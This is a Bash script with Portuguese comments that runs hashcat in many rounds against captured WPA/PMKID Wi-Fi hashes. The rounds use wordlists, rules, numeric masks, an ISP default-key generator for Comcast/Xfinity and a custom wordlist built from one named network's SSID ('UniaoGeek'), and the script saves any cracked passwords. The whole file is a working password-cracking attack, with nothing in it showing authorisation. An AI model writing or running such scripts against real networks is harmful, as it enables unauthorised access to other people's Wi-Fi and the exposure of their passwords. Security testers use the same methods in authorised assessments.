#!/usr/bin/env bash
# run_crack.sh — Sessão de crack otimizada (sem pipes problemáticos)
CUDA="LD_LIBRARY_PATH=/usr/lib/wsl/lib"
HC="hashcat"
HASHES="/tmp/pmkid_hashes.txt"
WL="/mnt/d/Projetos-SafeLabs/submodules/Wordlists"
WFH="$WL/WordListsForHacking/wfh.py"
RULES="/usr/share/hashcat/rules"
OUT="/tmp/wxf_crack3"
mkdir -p "$OUT"

echo ""; echo "=== Verificando hashes ==="
cat "$HASHES" | head -4
echo ""; echo "Total: $(wc -l < "$HASHES") hashes"

run_crack() {
    local label="$1"; local extra_args="${@:2}"
    echo ""; echo "=== $label ==="
    eval "$CUDA $HC -m 22000 $HASHES $extra_args --force --quiet 2>/dev/null"
    eval "$CUDA $HC -m 22000 $HASHES $extra_args --force --show 2>/dev/null" | while read line; do
        echo "  *** CRACKED: $line ***"
    done
    echo "  Completo: $label"
}

# RODADA 1: SecLists WiFi-WPA específico
run_crack "R1: SecLists WiFi-WPA 4800" \
    "$WL/SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt"

# RODADA 2: wlist_brasil
echo ""; echo "=== R2: wlist_brasil 55MB ==="
eval "$CUDA $HC -m 22000 $HASHES $WL/WordListsForHacking/passwords/wlist_brasil.lst --force --quiet 2>/dev/null"
echo "  R2 completa"

# RODADA 3: wlist_brasil + best64
echo ""; echo "=== R3: wlist_brasil + best64 rules ==="
eval "$CUDA $HC -m 22000 $HASHES $WL/WordListsForHacking/passwords/wlist_brasil.lst -r $RULES/best64.rule --force --quiet 2>/dev/null"
echo "  R3 completa"

# RODADA 4: rockyou + d3ad0ne
echo ""; echo "=== R4: rockyou + d3ad0ne rules ==="
eval "$CUDA $HC -m 22000 $HASHES /tmp/rockyou.txt -r $RULES/d3ad0ne.rule --force --quiet 2>/dev/null"
echo "  R4 completa"

# RODADA 5: kwalk
echo ""; echo "=== R5: WFH kwalk generator ==="
python3 "$WFH" kwalk --min-len 8 --max-len 12 --limit 200000 -o "$OUT/kwalk.lst" 2>/dev/null
echo "  kwalk: $(wc -l < "$OUT/kwalk.lst") entradas"
eval "$CUDA $HC -m 22000 $HASHES $OUT/kwalk.lst --force --quiet 2>/dev/null"
echo "  R5 completa"

# RODADA 6: mangle
echo ""; echo "=== R6: WFH mangle (leet speak WiFi wordlist) ==="
python3 "$WFH" mangle --wordlist "$WL/SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt" --limit 50000 -o "$OUT/mangle.lst" 2>/dev/null
echo "  mangle: $(wc -l < "$OUT/mangle.lst") entradas"
eval "$CUDA $HC -m 22000 $HASHES $OUT/mangle.lst --force --quiet 2>/dev/null"
echo "  R6 completa"

# RODADA 7-10: Máscaras numéricas BR
echo ""; echo "=== R7-10: Máscaras numéricas BR (8-11 dígitos) ==="
for D in 8 9 10 11; do
    MASK=$(python3 -c "print('?d'*$D)")
    echo "  Máscara: $MASK ($D dígitos)"
    eval "$CUDA $HC -m 22000 $HASHES -a 3 '$MASK' --force --quiet 2>/dev/null"
    echo "  R$((D-1)) completa"
done

# RODADA 11: ISP keygen
echo ""; echo "=== R11: WFH isp-keygen (500k entradas) ==="
python3 "$WFH" isp-keygen --isp xfinity_comcast --direction both --limit 500000 -o "$OUT/isp.lst" 2>/dev/null
echo "  isp: $(wc -l < "$OUT/isp.lst") entradas"
eval "$CUDA $HC -m 22000 $HASHES $OUT/isp.lst --force --quiet 2>/dev/null"
echo "  R11 completa"

# RODADA 12: Perfil SSID-based com WFH
echo ""; echo "=== R12: WFH profile SSID-based ==="
{
    echo "UniaoGeek"; echo "uniaogeek"; echo "uniao"; echo "Geek"
    echo "UniaGeek2024"; echo "UniaGeek2025"; echo "UniaGeek2026"
    echo "UniaoGeek!"; echo "UniaoGeek@"; echo "UniaoGeek#"
    echo "UNIAOGEEK"; echo "uniaogeek123"; echo "UniaoGeek123"
    echo "wifi2024"; echo "wifi2025"; echo "internet"; echo "rede"
} > "$OUT/ssid_base.lst"
python3 "$WFH" mangle --wordlist "$OUT/ssid_base.lst" --limit 10000 -o "$OUT/ssid_mangle.lst" 2>/dev/null
cat "$OUT/ssid_base.lst" >> "$OUT/ssid_mangle.lst"
echo "  ssid+mangle: $(wc -l < "$OUT/ssid_mangle.lst") entradas"
eval "$CUDA $HC -m 22000 $HASHES $OUT/ssid_mangle.lst --force --quiet 2>/dev/null"
eval "$CUDA $HC -m 22000 $HASHES $OUT/ssid_mangle.lst -r $RULES/best64.rule --force --quiet 2>/dev/null"
echo "  R12 completa"

# RODADA 13: Máscara alfanumérica lower+digit (muito comum BR)
echo ""; echo "=== R13: Máscara ?l?l?l?l?l?d?d?d (30min max) ==="
eval "$CUDA $HC -m 22000 $HASHES -a 3 '?l?l?l?l?l?d?d?d' --force --quiet --runtime 1800 2>/dev/null"
echo "  R13 completa"

# RESULTADO FINAL
echo ""; echo "================================================================"
echo "  RESULTADO FINAL — $(date)"
echo "================================================================"
CRACKED=$(eval "$CUDA $HC -m 22000 $HASHES --show 2>/dev/null" | grep -v "Separator")
if [ -n "$CRACKED" ]; then
    echo "  *** SENHA(S) ENCONTRADA(S) ***"
    echo "$CRACKED"
    echo "$CRACKED" > "$OUT/CRACKED.txt"
else
    echo "  Nenhuma senha encontrada."
    echo "  Wordlists testadas: rockyou, wlist_brasil, WiFi-WPA, isp-keygen, kwalk, mangle, masks"
fi

echo ""
echo "Arquivos gerados:"
ls -lh "$OUT/"
